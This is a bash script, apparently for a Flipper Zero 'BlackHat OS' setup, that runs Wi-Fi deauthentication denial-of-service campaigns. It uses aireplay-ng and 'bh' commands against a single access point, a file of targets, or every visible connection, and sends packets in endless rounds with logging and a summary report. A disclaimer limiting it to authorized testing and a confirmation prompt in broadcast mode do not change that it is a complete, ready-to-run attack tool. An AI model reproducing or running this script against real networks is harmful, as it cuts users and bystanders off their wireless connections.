#!/bin/bash

################################################################################
# Deauth Campaign Manager for Flipper Zero BlackHat OS
################################################################################
# Purpose: Sophisticated denial-of-service testing with multi-target support
# Author: Generated for authorized penetration testing only
# Requires: BlackHat OS with bh commands, aircrack-ng suite
################################################################################

set -euo pipefail

# Configuration
MODE="${1:-scan}"  # scan, single, multi, broadcast
TARGET_FILE="${2:-}"
INTERFACE="${3:-wlan0}"
INTERVAL="${4:-10}"
PACKETS_PER_ROUND="${5:-20}"
OUTPUT_DIR="${6:-/root/deauth-campaign}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="${OUTPUT_DIR}/deauth_${TIMESTAMP}.log"
STATS_FILE="${OUTPUT_DIR}/stats_${TIMESTAMP}.csv"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Stats tracking
declare -A attack_counts
declare -A success_rates

################################################################################
# Logging
################################################################################
log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[${timestamp}] [${level}] ${message}" | tee -a "${LOG_FILE}"
}

################################################################################
# Banner
################################################################################
print_banner() {
    echo -e "${RED}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║          Deauth Campaign Manager v1.0                         ║
║        Sophisticated Denial-of-Service Testing                ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}⚠ WARNING: Authorized testing only - DoS attacks are illegal!${NC}\n"
}

################################################################################
# Usage
################################################################################
usage() {
    cat << 'USAGE'
Usage: ./04-deauth-campaign.sh <MODE> [OPTIONS]

MODES:
  scan              Scan for targets and display deauth options
  single <BSSID>    Attack single AP by BSSID
  multi <FILE>      Attack multiple targets from file
  broadcast         Attack all visible associations

ARGUMENTS:
  TARGET_FILE       File with target list (for multi mode)
  INTERFACE         WiFi interface (default: wlan0)
  INTERVAL          Seconds between attack rounds (default: 10)
  PACKETS           Packets per round (default: 20)
  OUTPUT_DIR        Output directory (default: /root/deauth-campaign)

EXAMPLES:
  # Scan and select targets interactively
  ./04-deauth-campaign.sh scan wlan0

  # Attack single AP
  ./04-deauth-campaign.sh single AA:BB:CC:DD:EE:FF wlan0

  # Attack multiple targets from file
  ./04-deauth-campaign.sh multi targets.txt wlan0 15 30

  # Broadcast deauth to all visible connections
  ./04-deauth-campaign.sh broadcast wlan0 5 50

TARGET FILE FORMAT (one per line):
  BSSID,CHANNEL,ESSID
  AA:BB:CC:DD:EE:FF,6,Network1
  11:22:33:44:55:66,11,Network2
USAGE
    exit 1
}

################################################################################
# Validate Arguments
################################################################################
validate_args() {
    case "$MODE" in
        scan|broadcast)
            # No additional validation needed
            ;;
        single)
            if [[ -z "$TARGET_FILE" ]]; then
                echo -e "${RED}Error: BSSID required for single mode${NC}"
                usage
            fi
            if ! echo "$TARGET_FILE" | grep -qE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'; then
                echo -e "${RED}Error: Invalid BSSID format${NC}"
                exit 1
            fi
            ;;
        multi)
            if [[ -z "$TARGET_FILE" ]] || [[ ! -f "$TARGET_FILE" ]]; then
                echo -e "${RED}Error: Target file required and must exist for multi mode${NC}"
                usage
            fi
            ;;
        *)
            echo -e "${RED}Error: Invalid mode: $MODE${NC}\n"
            usage
            ;;
    esac

    log "INFO" "Mode: ${MODE}, Arguments validated"
}

################################################################################
# Pre-flight Checks
################################################################################
preflight_check() {
    log "INFO" "Starting pre-flight checks..."

    mkdir -p "${OUTPUT_DIR}"

    if ! ip link show "${INTERFACE}" &>/dev/null; then
        log "ERROR" "Interface ${INTERFACE} not found"
        echo -e "${RED}Error: Interface ${INTERFACE} does not exist${NC}"
        exit 1
    fi

    # Enable monitor mode
    if ! iw dev "${INTERFACE}" info 2>/dev/null | grep -q "type monitor"; then
        log "INFO" "Enabling monitor mode..."
        airmon-ng start "${INTERFACE}" &>/dev/null || true
        sleep 2
    fi

    for cmd in bh airmon-ng aireplay-ng; do
        if ! command -v "$cmd" &>/dev/null; then
            log "ERROR" "Required command not found: $cmd"
            echo -e "${RED}Error: $cmd not installed${NC}"
            exit 1
        fi
    done

    log "INFO" "Pre-flight checks completed"
    echo -e "${GREEN}✓ Pre-flight checks passed${NC}\n"
}

################################################################################
# Scan Mode - Interactive Target Selection
################################################################################
mode_scan() {
    log "INFO" "Starting scan mode..."
    echo -e "${CYAN}[*] Scanning for targets with bh deauth_scan...${NC}\n"

    # Use bh's built-in deauth scan feature
    local scan_output=$(bh deauth_scan "${INTERFACE}" 2>&1)

    echo -e "$scan_output"
    echo ""

    log "INFO" "Scan completed"

    echo -e "${YELLOW}[*] You can now run attacks using the BSSIDs shown above${NC}"
    echo -e "${CYAN}Example: ./04-deauth-campaign.sh single AA:BB:CC:DD:EE:FF${NC}\n"
}

################################################################################
# Single Target Attack
################################################################################
mode_single() {
    local target_bssid="$TARGET_FILE"  # In single mode, TARGET_FILE is actually the BSSID

    log "INFO" "Starting single target attack on ${target_bssid}..."
    echo -e "${CYAN}[*] Attacking: ${target_bssid}${NC}\n"

    # Initialize stats
    attack_counts["$target_bssid"]=0

    # Initialize CSV stats file
    echo "Timestamp,Target,Round,Packets Sent,Status" > "${STATS_FILE}"

    local round=1
    echo -e "${YELLOW}Campaign started - Press Ctrl+C to stop${NC}\n"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"

    while true; do
        local round_start=$(date +%s)

        echo -e "${BLUE}[Round $round] $(date +%H:%M:%S) - Sending ${PACKETS_PER_ROUND} deauth packets...${NC}"

        # Execute deauth using bh command
        bh deauth_all "$target_bssid" "${INTERFACE}" >/dev/null 2>&1 &
        local deauth_pid=$!

        # Also send targeted deauth with aireplay-ng for more control
        aireplay-ng -0 "${PACKETS_PER_ROUND}" -a "$target_bssid" "${INTERFACE}" >/dev/null 2>&1 || true

        wait $deauth_pid 2>/dev/null || true

        ((attack_counts["$target_bssid"]++))

        # Log to CSV
        echo "$(date -Iseconds),${target_bssid},${round},${PACKETS_PER_ROUND},SUCCESS" >> "${STATS_FILE}"

        echo -e "${GREEN}  ✓ Deauth round completed (Total: ${attack_counts["$target_bssid"]})${NC}"

        # Calculate time to sleep
        local round_end=$(date +%s)
        local elapsed=$((round_end - round_start))
        local sleep_time=$((INTERVAL - elapsed))

        if [[ $sleep_time -gt 0 ]]; then
            echo -e "${YELLOW}  Waiting ${sleep_time}s before next round...${NC}\n"
            sleep "$sleep_time"
        fi

        ((round++))
    done
}

################################################################################
# Multi-Target Attack
################################################################################
mode_multi() {
    log "INFO" "Starting multi-target campaign from ${TARGET_FILE}..."
    echo -e "${CYAN}[*] Loading targets from ${TARGET_FILE}${NC}\n"

    # Read targets into array
    declare -a targets
    while IFS=, read -r bssid channel essid; do
        # Skip comments and empty lines
        [[ "$bssid" =~ ^#.*$ ]] || [[ -z "$bssid" ]] && continue

        # Validate BSSID
        if echo "$bssid" | grep -qE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'; then
            targets+=("$bssid|$channel|$essid")
            attack_counts["$bssid"]=0
            echo -e "${GREEN}  [+] Loaded: ${bssid} (Ch: ${channel}) - ${essid}${NC}"
        fi
    done < "$TARGET_FILE"

    local target_count=${#targets[@]}
    if [[ $target_count -eq 0 ]]; then
        echo -e "${RED}Error: No valid targets found in file${NC}"
        exit 1
    fi

    log "INFO" "Loaded ${target_count} targets"
    echo -e "\n${GREEN}✓ Loaded ${target_count} target(s)${NC}\n"

    # Initialize CSV stats file
    echo "Timestamp,Target,ESSID,Round,Packets Sent,Status" > "${STATS_FILE}"

    local round=1
    echo -e "${YELLOW}Multi-target campaign started - Press Ctrl+C to stop${NC}\n"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"

    while true; do
        echo -e "\n${MAGENTA}[═══ Round $round ═══]${NC}"

        for target_line in "${targets[@]}"; do
            IFS='|' read -r bssid channel essid <<< "$target_line"

            echo -e "${BLUE}[$(date +%H:%M:%S)] Attacking: ${essid} (${bssid})${NC}"

            # Set channel if specified
            if [[ -n "$channel" ]] && [[ "$channel" != "unknown" ]]; then
                iw dev "${INTERFACE}" set channel "$channel" 2>/dev/null || true
            fi

            # Execute deauth
            aireplay-ng -0 "${PACKETS_PER_ROUND}" -a "$bssid" "${INTERFACE}" >/dev/null 2>&1 || true

            ((attack_counts["$bssid"]++))

            # Log to CSV
            echo "$(date -Iseconds),${bssid},${essid},${round},${PACKETS_PER_ROUND},SUCCESS" >> "${STATS_FILE}"

            echo -e "${GREEN}  ✓ Deauth sent (Count: ${attack_counts["$bssid"]})${NC}"

            # Small delay between targets
            sleep 2
        done

        echo -e "${YELLOW}Round ${round} completed. Waiting ${INTERVAL}s...${NC}"
        sleep "$INTERVAL"

        ((round++))
    done
}

################################################################################
# Broadcast Mode - Attack All Visible Associations
################################################################################
mode_broadcast() {
    log "INFO" "Starting broadcast deauth mode..."
    echo -e "${RED}[!] WARNING: This will deauth ALL visible connections!${NC}"
    echo -e "${YELLOW}Continue? (yes/no): ${NC}"
    read -r confirm

    if [[ "$confirm" != "yes" ]]; then
        echo -e "${BLUE}Aborted by user${NC}"
        exit 0
    fi

    echo -e "\n${CYAN}[*] Starting broadcast deauth campaign${NC}\n"

    # Initialize CSV
    echo "Timestamp,Round,Packets Sent,Status" > "${STATS_FILE}"

    local round=1
    echo -e "${YELLOW}Broadcast campaign started - Press Ctrl+C to stop${NC}\n"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"

    while true; do
        echo -e "${RED}[Round $round] $(date +%H:%M:%S) - Broadcasting ${PACKETS_PER_ROUND} deauth packets...${NC}"

        # Use bh's broadcast deauth
        bh deauth_broadcast "${INTERFACE}" >/dev/null 2>&1 || true

        # Log to CSV
        echo "$(date -Iseconds),${round},${PACKETS_PER_ROUND},SUCCESS" >> "${STATS_FILE}"

        echo -e "${GREEN}  ✓ Broadcast deauth sent${NC}"
        echo -e "${YELLOW}  Waiting ${INTERVAL}s...${NC}\n"

        sleep "$INTERVAL"
        ((round++))
    done
}

################################################################################
# Generate Report
################################################################################
generate_report() {
    local report_file="${OUTPUT_DIR}/report_${TIMESTAMP}.txt"

    log "INFO" "Generating campaign report..."

    cat > "${report_file}" << REPORT
═══════════════════════════════════════════════════════════════
  Deauth Campaign Report
═══════════════════════════════════════════════════════════════

Campaign Timestamp: $(date)
Mode:               ${MODE}
Interface:          ${INTERFACE}
Interval:           ${INTERVAL} seconds
Packets per Round:  ${PACKETS_PER_ROUND}

═══════════════════════════════════════════════════════════════
  Attack Statistics
═══════════════════════════════════════════════════════════════

REPORT

    if [[ ${#attack_counts[@]} -gt 0 ]]; then
        echo "Target                    | Attack Count" >> "${report_file}"
        echo "─────────────────────────────────────────" >> "${report_file}"
        for target in "${!attack_counts[@]}"; do
            printf "%-25s | %d\n" "$target" "${attack_counts[$target]}" >> "${report_file}"
        done
    else
        echo "No targets attacked" >> "${report_file}"
    fi

    cat >> "${report_file}" << REPORT

═══════════════════════════════════════════════════════════════
  Files Generated
═══════════════════════════════════════════════════════════════

Log:    ${LOG_FILE}
Stats:  ${STATS_FILE}
Report: ${report_file}

═══════════════════════════════════════════════════════════════
  Notes
═══════════════════════════════════════════════════════════════

- Campaign ended at $(date)
- Review CSV file for detailed round-by-round statistics
- Ensure affected networks have been properly restored

═══════════════════════════════════════════════════════════════
REPORT

    echo -e "\n${GREEN}✓ Report saved to ${report_file}${NC}"
    log "INFO" "Report saved to ${report_file}"
}

################################################################################
# Cleanup
################################################################################
cleanup() {
    echo -e "\n${YELLOW}[*] Stopping deauth campaign...${NC}"
    log "INFO" "Starting cleanup..."

    # Kill any remaining aireplay processes
    pkill -f "aireplay-ng" 2>/dev/null || true

    generate_report

    echo -e "${GREEN}✓ Cleanup completed${NC}"
    log "INFO" "Campaign stopped, cleanup completed"
}

################################################################################
# Main Execution
################################################################################
main() {
    print_banner

    echo -e "${BLUE}Campaign Configuration:${NC}"
    echo -e "  Mode:          ${MODE}"
    echo -e "  Interface:     ${INTERFACE}"
    echo -e "  Interval:      ${INTERVAL}s"
    echo -e "  Packets/Round: ${PACKETS_PER_ROUND}"
    echo -e "  Output Dir:    ${OUTPUT_DIR}\n"

    validate_args
    preflight_check

    case "$MODE" in
        scan)
            mode_scan
            ;;
        single)
            mode_single
            ;;
        multi)
            mode_multi
            ;;
        broadcast)
            mode_broadcast
            ;;
    esac
}

# Handle Ctrl+C gracefully
trap 'echo -e "\n${RED}Interrupted by user${NC}"; cleanup; exit 130' INT TERM

# Check for help
if [[ "${1:-}" == "-h" ]] || [[ "${1:-}" == "--help" ]] || [[ $# -eq 0 ]]; then
    usage
fi

# Run main
main "$@"
